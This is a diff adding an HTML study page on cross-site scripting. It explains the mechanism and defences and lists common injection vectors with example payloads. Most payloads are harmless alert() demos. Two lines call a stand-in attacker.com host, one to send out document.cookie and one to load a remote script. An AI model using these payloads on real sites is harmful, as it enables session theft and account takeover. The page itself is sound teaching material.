@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cross-Site Scripting (XSS) Notes</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      /* Global Styles for Blackish Theme */
+      :root {
+        --bg-color: #1e1e1e; /* Dark VS Code background */
+        --main-text-color: #d4d4d4; /* Light grey text */
+        --heading-color: #569cd6; /* Blue for primary headings */
+        --sub-heading-color: #ffd700; /* Gold for subheadings */
+        --danger-color: #f44747; /* Red for alerts */
+        --code-bg: #1f1f1f; /* Slightly darker code block background */
+        --border-color: #3f3f3f;
+        --table-header-bg: #333333;
+      }
+
+      body {
+        font-family: 'Nunito', sans-serif;
+        background-color: var(--bg-color);
+        color: var(--main-text-color);
+        line-height: 1.6;
+        padding: 20px;
+        margin: 0;
+      }
+
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+        background-color: #252526; /* Main content area, slightly lighter than body */
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+      }
+
+      h1,
+      h2,
+      h3 {
+        font-weight: 700;
+        padding-bottom: 5px;
+        margin-top: 25px;
+      }
+
+      h1 {
+        color: var(--heading-color);
+        border-bottom: 2px solid var(--border-color);
+      }
+
+      h2 {
+        color: var(--sub-heading-color);
+        border-bottom: 1px dashed var(--border-color);
+      }
+
+      /* Basic Text Styling */
+      p {
+        margin-bottom: 15px;
+      }
+
+      strong {
+        color: var(--sub-heading-color);
+      }
+
+      .danger {
+        color: var(--danger-color);
+        font-weight: bold;
+      }
+
+      /* List Styling */
+      ul {
+        list-style-type: none;
+        padding-left: 20px;
+      }
+
+      ul li::before {
+        content: '•';
+        color: var(--danger-color);
+        font-weight: bold;
+        display: inline-block;
+        width: 1em;
+        margin-left: -1em;
+      }
+
+      /* Table Styling */
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 20px 0;
+        background-color: #3c3c3c;
+        color: var(--main-text-color);
+        font-size: 0.9em;
+      }
+
+      th,
+      td {
+        border: 1px solid var(--border-color);
+        padding: 10px;
+        text-align: left;
+      }
+
+      th {
+        background-color: var(--table-header-bg);
+        color: var(--heading-color);
+        font-weight: bold;
+      }
+
+      /* Code Block Styling (VS Code-like Blackish Theme) */
+      .code-container {
+        background-color: var(--code-bg);
+        padding: 15px;
+        border-radius: 6px;
+        margin: 20px 0;
+        overflow-x: auto;
+        border: 1px solid #007acc; /* VS Code blue border */
+      }
+
+      .code-container pre {
+        margin: 0;
+        font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+        font-size: 14px;
+      }
+
+      /* Syntax Highlighting Mimicry */
+      .comment {
+        color: #6a9955;
+      } /* Green */
+      .keyword {
+        color: #569cd6;
+      } /* Blue */
+      .function {
+        color: #dcdcaa;
+      } /* Yellow */
+      .string {
+        color: #ce9178;
+      } /* Orange */
+      .property {
+        color: #9cdcfe;
+      } /* Light Blue */
+      .variable {
+        color: #4ec9b0;
+      } /* Teal */
+      .operator {
+        color: #d4d4d4;
+      } /* White */
+      .language-name {
+        color: #c586c0;
+        font-weight: bold;
+      } /* Purple */
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>❗ What is Cross-Site Scripting (XSS)?</h1>
+
+      <p>
+        <strong>Cross-Site Scripting (XSS)</strong> is a type of security
+        vulnerability typically found in web applications. It occurs when a web
+        application allows an attacker to inject client-side scripts (most
+        commonly JavaScript) into the output of a web page viewed by other
+        users.
+      </p>
+
+      <p>
+        When a victim's browser loads the page, it executes the
+        <strong>malicious script</strong>
+        because it trusts the content coming from the application's server.
+      </p>
+      <p>
+        Despite the name, XSS is **not about cross-origin requests** or
+        "crossing sites" in the traditional sense. It’s about injecting scripts
+        **into a site** that then get executed **in the browser of another
+        user**.
+      </p>
+
+      <h2>🤔 Why is it called "Cross-Site Scripting"?</h2>
+      <p>
+        The term comes from the early days of the web when attackers would
+        inject malicious scripts that **crossed from one site into another** via
+        shared cookies or sessions. To avoid confusion with "Cascading Style
+        Sheets (CSS)," the name was abbreviated as **XSS, not CSS**.
+      </p>
+      <p>So, while the name isn't very intuitive, the idea is:</p>
+      <blockquote>
+        "A script written by an attacker is executed in the browser of another
+        user — <strong>inside the context of a trusted site.</strong>"
+      </blockquote>
+
+      <h2>💻 How XSS Works: The Mechanism</h2>
+      <p>
+        XSS attacks exploit the lack of proper input validation and output
+        encoding on the server-side application. The core process follows these
+        steps:
+      </p>
+      <ol>
+        <li>
+          <strong>Injection: </strong> An attacker sends malicious code (the
+          payload) to the web application. This payload is often hidden within a
+          user input field (like a search bar, comment section, or profile
+          field) that they know is vulnerable.
+        </li>
+        <li>
+          <strong>Storage/Reflection:</strong> The vulnerable application either
+          stores this malicious input in its database
+          <span class="keyword">(Stored XSS)</span> or immediately displays it
+          back to the user or another user
+          <span class="keyword">(Reflected XSS)</span>.
+        </li>
+        <li>
+          <strong>Execution:</strong> The victim's browser requests the page
+          containing the malicious payload. The server sends the response,
+          including the unvalidated script. The browser sees standard HTML and
+          JavaScript and <span class="keyword">executes the script</span>,
+          thinking it's legitimate content from the site.
+        </li>
+      </ol>
+
+      <h2>🔥 Why XSS is Dangerous</h2>
+      <p>
+        If an attacker can execute JavaScript in another user's browser, they
+        can:
+      </p>
+      <ul>
+        <li>Steal **session cookies** and impersonate the user</li>
+        <li>
+          Access **<span class="property">localStorage</span>**, **<span
+            class="property"
+            >sessionStorage</span
+          >**, or other sensitive browser data
+        </li>
+        <li>Perform actions on behalf of the user (like transferring funds)</li>
+        <li>Deface or rewrite the page content</li>
+        <li>Trick users into entering passwords into fake login forms</li>
+        <li>
+          Escalate into full account takeover or even administrative control
+        </li>
+      </ul>
+
+      <h2>🧠 Real Example</h2>
+      <p>If a comment form doesn’t sanitize input:</p>
+
+      <div class="code-container">
+        <pre><span class="tag">&lt;input</span> <span class="property">value</span>=<span class="string">"&lt;script&gt;fetch('http://attacker.com?c='+document.cookie)&lt;/script&gt;"</span><span class="tag">&gt;</span></pre>
+      </div>
+
+      <p>
+        Then any user viewing that comment triggers the script — their cookie is
+        sent to the attacker.
+      </p>
+
+      <h2>🔐 Defenses Against XSS</h2>
+      <ul>
+        <li>
+          **Escape HTML** before rendering user input (or better: don’t render
+          HTML at all)
+        </li>
+        <li>
+          Use a **frontend sanitizer** like
+          <span class="keyword">DOMPurify</span>
+        </li>
+        <li>
+          Enable **Content Security Policy (CSP)** to block inline scripts
+        </li>
+        <li>
+          Avoid <span class="property">innerHTML</span> and prefer safer DOM
+          APIs
+        </li>
+        <li>
+          **Never use** <span class="function">eval</span>,
+          <span class="keyword">new</span>
+          <span class="function">Function</span>, or string-based
+          <span class="function">setTimeout</span> with user input
+        </li>
+      </ul>
+
+      <h2>✅ Summary</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Aspect</th>
+            <th>Explanation</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>XSS stands for</td>
+            <td>Cross-Site Scripting</td>
+          </tr>
+          <tr>
+            <td>Name origin</td>
+            <td>Historical, not very intuitive</td>
+          </tr>
+          <tr>
+            <td>Goal of attack</td>
+            <td>Inject and execute JS in victim's browser</td>
+          </tr>
+          <tr>
+            <td>Risk level</td>
+            <td><span class="danger">Extremely dangerous</span></td>
+          </tr>
+          <tr>
+            <td>Protection</td>
+            <td>Sanitize input, use CSP, secure DOM usage</td>
+          </tr>
+        </tbody>
+      </table>
+      <p>
+        XSS is one of the **most common and dangerous vulnerabilities** in web
+        applications. It doesn’t just affect users — it can compromise entire
+        systems if exploited well. 🛑
+      </p>
+
+      ---
+
+      <h1>🛑 Common JavaScript Execution Methods Used in XSS Attacks</h1>
+
+      <p>
+        Cross-Site Scripting (XSS) attacks aim to execute arbitrary JavaScript
+        in the context of a victim’s browser. Attackers use various methods to
+        inject and run malicious code, often exploiting injection points in
+        **HTML, attributes, URLs, and JS APIs**.
+      </p>
+      <p>
+        Below are the most commonly abused vectors and techniques used during
+        real-world XSS attacks:
+      </p>
+
+      <ol>
+        <li>
+          **<span class="tag">&lt;img onerror="..."&gt;</span> — Attribute-Based
+          Execution**
+          <p>Triggers when the image fails to load.</p>
+          <div class="code-container">
+            <pre><span class="tag">&lt;img</span> <span class="property">src</span>=<span class="string">"x"</span> <span class="property">onerror</span>=<span class="string">"alert('XSS')"</span> <span class="tag">/&gt;</span></pre>
+          </div>
+        </li>
+        <li>
+          **<span class="tag">&lt;script&gt;</span> Injection**
+          <p>
+            Copying and pasting the untrusted code in the browser's console.
+          </p>
+          <div class="code-container">
+            <pre><span class="keyword">const</span> <span class="variable">s</span> <span class="operator">=</span> <span class="variable">document</span>.<span class="function">createElement</span>(<span class="string">"script"</span>);
+<span class="variable">s</span>.<span class="property">src</span> <span class="operator">=</span> <span class="string">"http://attacker.com/script.js"</span>;
+<span class="variable">document</span>.<span class="property">body</span>.<span class="function">appendChild</span>(<span class="variable">s</span>);</pre>
+          </div>
+        </li>
+        <li>
+          **Inline Event Handlers** (e.g.,
+          <span class="property">onclick</span>,
+          <span class="property">onmouseover</span>)
+          <div class="code-container">
+            <pre><span class="tag">&lt;div</span> <span class="property">onclick</span>=<span class="string">"alert('XSS')"</span><span class="tag">></span>Click Me<span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;a</span> <span class="property">href</span>=<span class="string">"#"</span> <span class="property">onmouseover</span>=<span class="string">"alert('XSS')"</span><span class="tag">></span>Hover Me<span class="tag">&lt;/a&gt;</span></pre>
+          </div>
+        </li>
+        <li>
+          **<span class="keyword">javascript:</span> URLs**
+          <p>Common in <span class="property">href</span> attributes:</p>
+          <div class="code-container">
+            <pre><span class="tag">&lt;a</span> <span class="property">href</span>=<span class="string">"javascript:alert('XSS')"</span><span class="tag">></span>Click<span class="tag">&lt;/a&gt;</span></pre>
+          </div>
+        </li>
+        <li>
+          **<span class="tag">&lt;iframe src="javascript:..."&gt;</span>**
+          <div class="code-container">
+            <pre><span class="tag">&lt;iframe</span> <span class="property">src</span>=<span class="string">"javascript:alert('XSS')"</span><span class="tag">&gt;&lt;/iframe&gt;</span></pre>
+          </div>
+        </li>
+        <li>
+          **DOM-Based XSS**
+          <p>The vulnerable code is in the frontend, like:</p>
+          <div class="code-container">
+            <pre><span class="variable">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> <span class="operator">=</span> <span class="variable">location</span>.<span class="property">hash</span>;</pre>
+          </div>
+          <p>
+            URL:
+            <span class="string"
+              >https://example.com/#&lt;img src=x onerror=alert('XSS')&gt;</span
+            >
+          </p>
+        </li>
+        <li>
+          **<span class="function">eval()</span> or
+          <span class="function">Function()</span> execution**
+          <p>Used when user input is passed directly into dangerous JS APIs:</p>
+          <div class="code-container">
+            <pre><span class="function">eval</span>(<span class="variable">userInput</span>); <span class="comment">// BAD</span>
+<span class="keyword">new</span> <span class="function">Function</span>(<span class="variable">userInput</span>)(); <span class="comment">// BAD</span></pre>
+          </div>
+        </li>
+        <li>
+          **<span class="function">setTimeout("...", delay)</span> or
+          <span class="function">setInterval("...", interval)</span>**
+          <p>Attackers inject JS into the string form:</p>
+          <div class="code-container">
+            <pre><span class="function">setTimeout</span>(<span class="string">"alert('XSS')"</span>, <span class="property">1000</span>);</pre>
+          </div>
+        </li>
+        <li>
+          **Malformed <span class="tag">&lt;svg&gt;</span> or
+          <span class="tag">&lt;math&gt;</span> Tags**
+          <p>
+            Some browsers allow script execution inside SVG with event handlers:
+          </p>
+          <div class="code-container">
+            <pre><span class="tag">&lt;svg</span> <span class="property">onload</span>=<span class="string">"alert('XSS')"</span><span class="tag">&gt;&lt;/svg&gt;</span></pre>
+          </div>
+        </li>
+        <li>
+          **<span class="tag">&lt;object&gt;</span>,
+          <span class="tag">&lt;embed&gt;</span>, and
+          <span class="tag">&lt;body onload&gt;</span>**
+          <div class="code-container">
+            <pre><span class="tag">&lt;body</span> <span class="property">onload</span>=<span class="string">"alert('XSS')"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;object</span> <span class="property">data</span>=<span class="string">"javascript:alert('XSS')"</span><span class="tag">&gt;&lt;/object&gt;</span>
+<span class="tag">&lt;/body&gt;</span></pre>
+          </div>
+        </li>
+        <li>
+          **Script Injection via <span class="tag">&lt;meta&gt;</span> or
+          malformed <span class="tag">&lt;style&gt;</span>**
+          <div class="code-container">
+            <pre><span class="tag">&lt;meta</span> <span class="property">http-equiv</span>=<span class="string">"refresh"</span> <span class="property">content</span>=<span class="string">"0;url=javascript:alert('XSS')"</span> <span class="tag">/&gt;</span>
+<span class="tag">&lt;style&gt;</span>
+  <span class="property">@import</span> <span class="string">'javascript:alert("XSS")'</span>;<span class="tag">&lt;/style&gt;</span></pre>
+          </div>
+        </li>
+      </ol>
+
+      <h2>🚨 Summary Table</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Technique</th>
+            <th>Vector Type</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><span class="tag">&lt;img onerror&gt;</span></td>
+            <td>Attribute-based</td>
+            <td>Very common, simple payload</td>
+          </tr>
+          <tr>
+            <td><span class="tag">&lt;script&gt;</span> tag</td>
+            <td>HTML injection</td>
+            <td>
+              Works if <span class="property">innerHTML</span> is used unsafely
+            </td>
+          </tr>
+          <tr>
+            <td>Inline handlers</td>
+            <td>HTML injection</td>
+            <td>Works if tag attributes are not escaped</td>
+          </tr>
+          <tr>
+            <td><span class="keyword">javascript:</span> URLs</td>
+            <td>URI-based</td>
+            <td>Often blocked by CSP in modern apps</td>
+          </tr>
+          <tr>
+            <td>
+              <span class="function">eval</span>,
+              <span class="function">Function</span>
+            </td>
+            <td>JavaScript APIs</td>
+            <td>Dangerous, should never be used with user input</td>
+          </tr>
+          <tr>
+            <td><span class="tag">&lt;svg onload&gt;</span></td>
+            <td>SVG namespace</td>
+            <td>Works in some browser contexts</td>
+          </tr>
+          <tr>
+            <td><span class="tag">&lt;iframe src="javascript:"&gt;</span></td>
+            <td>Tag-based</td>
+            <td>Often blocked by CSP</td>
+          </tr>
+          <tr>
+            <td>DOM-based injection</td>
+            <td>Frontend logic flaw</td>
+            <td>Harder to detect in static scans</td>
+          </tr>
+        </tbody>
+      </table>
+      <p>
+        ✅ **Defense:** Always **sanitize user input**, use **CSP headers**,
+        avoid inline JS, and use trusted libraries like **DOMPurify**.
+      </p>
+    </div>
+  </body>
+</html>
